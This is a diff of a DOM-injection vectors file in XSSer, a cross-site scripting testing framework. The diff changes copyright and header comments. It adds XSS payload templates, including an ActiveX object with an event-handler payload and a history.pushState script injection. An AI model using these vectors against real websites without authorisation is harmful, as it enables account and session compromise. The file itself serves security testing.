@@ -3,7 +3,7 @@ $Id$
 
 This file is part of the xsser project, http://xsser.sourceforge.net.
 
-Copyright (c) 2011/2012/2013 psy <root@lordepsylon.net> - <epsylon@riseup.net>
+Copyright (c) 2011/2012/2013/2014/2015 - <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -18,11 +18,8 @@ You should have received a copy of the GNU General Public License along
 with xsser; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-
-## XSSer.py @@ DOM vectors @@ psy
-#
-## This file contains different XSS vectors to inject in the Document Object Model (DOM).
-## If you have some new vectors, please email me to [root@lordepsylon.net - epsylon@riseup.net] and will be added to XSSer framework.
+## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
+## If you have some new vectors, please email me to [epsylon@riseup.net] and will be added to XSSer framework.
 ## Thats all.
 ###
 ## Happy Cross Hacking! ;)
@@ -33,11 +30,14 @@ DOMvectors = [
 		  
 		{ 'payload' : """?notname=PAYLOAD&""",
 		  'browser' : """[Document Object Model Injection]"""},
-		  
-		{ 'payload' : """?foobar=name=PAYLOAD&""",
+
+		{ 'payload':'''<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="PAYLOAD" style="behavior:url(#x);"><param name=postdomevents /></object>''',
 		  'browser' : """[Document Object Model Injection]"""},
 
-		{ 'payload' : """<link rel='stylesheet' href='xss.css'><a href='http://goo.gl/zWbtT'><div id='xss'""",
-		  'input' : """[Document Object Model Injection]"""}
+		{ 'payload' : """?<script>history.pushState(0,0,'PAYLOAD');</script>""",
+		  'browser' : """[Document Object Model Injection]"""},
+		  
+		{ 'payload' : """?foobar=name=PAYLOAD&""",
+		  'browser' : """[Document Object Model Injection]"""}
 		]
 
